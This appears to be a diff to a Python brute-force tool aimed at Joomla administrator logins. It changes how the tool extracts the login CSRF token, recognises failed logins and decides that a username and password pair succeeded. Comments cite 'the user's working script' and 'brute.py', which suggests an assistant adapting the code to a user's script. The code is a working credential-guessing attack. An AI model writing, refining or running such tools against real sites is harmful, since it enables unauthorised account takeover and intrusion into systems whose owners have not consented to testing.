@@ -468,22 +468,24 @@ def _get_csrf_token(session: requests.Session, admin_url: str,
                     timeout: int) -> Optional[str]:
     """
     Fetch the Joomla admin login page and extract the CSRF token.
-    Joomla embeds a hidden input whose *name* is the token (value=1).
-    Returns the token name string, or None on failure.
+    The user's working script simply grabs the *last* hidden input.
+    We will do the same but exclude standard fields to be safe.
     """
     try:
         resp = session.get(admin_url, timeout=timeout)
         soup = BeautifulSoup(resp.text, "html.parser")
-        # Joomla's CSRF token: last hidden input, 32-char hex name, value="1"
         hidden = soup.find_all("input", type="hidden")
+        
+        # Known standard fields to ignore
+        standard_fields = {"username", "passwd", "option", "task", "return"}
+        
+        # Iterate backwards to find the standard anti-csrf token
+        # (usually the last distinct hidden field)
         for inp in reversed(hidden):
             name = inp.get("name", "")
-            val  = inp.get("value", "")
-            if re.fullmatch(r"[0-9a-f]{32}", name) and val == "1":
+            if name and name not in standard_fields:
                 return name
-        # Fallback: last hidden input
-        if hidden:
-            return hidden[-1].get("name")
+                
     except Exception:
         pass
     return None
@@ -508,15 +510,19 @@ def _detect_lockout(html: str) -> bool:
 
 def _is_login_failure(soup: BeautifulSoup) -> bool:
     """Return True if the page contains a Joomla login error alert."""
-    # Joomla 3.x / 4.x error containers
-    for cls in ("alert-error", "alert-danger", "alert-message", "error"):
+    # Check for standard alert containers (Joomla 3/4/5)
+    # The working script specifically checks for 'alert-message'
+    for cls in ("alert-message", "alert-error", "alert-danger", "alert-warning"):
         if soup.find(class_=cls):
             return True
-    # Generic: check for "Invalid" in alerts
+            
+    # Also check generic "alert" classes if they contain "Invalid" or "Warning"
     alerts = soup.find_all("div", class_=re.compile(r"alert"))
     for a in alerts:
-        if "invalid" in a.get_text().lower():
+        text = a.get_text().lower()
+        if "invalid" in text or "warning" in text or "match" in text:
             return True
+            
     return False
 
 
@@ -555,14 +561,16 @@ def _try_credential(session: requests.Session, admin_url: str,
     soup    = BeautifulSoup(resp.text, "html.parser")
     failure = _is_login_failure(soup)
 
-    # Success signals: redirected to /administrator/index.php with no error,
-    # or the page title changed away from "Log in"
-    title = (soup.title.string or "") if soup.title else ""
-    logged_in = (
-        not failure
-        and "log in" not in title.lower()
-        and resp.url.rstrip("/").endswith("administrator")
-    )
+    # Success logic matching brute.py:
+    # If the response does NOT contain an error alert, we assume success.
+    # We also check if we've been redirected to the dashboard (index.php) just to be sure,
+    # but primarily rely on the absence of failure signals.
+    
+    on_dashboard = "index.php" in resp.url or "cpanel" in resp.url or "dashboard" in resp.text.lower()
+    
+    # If no failure alert is found, consider it a success.
+    # (The user's script relies *solely* on the absence of 'alert-message')
+    logged_in = not failure
 
     return BruteResult(username, password, success=logged_in)
 
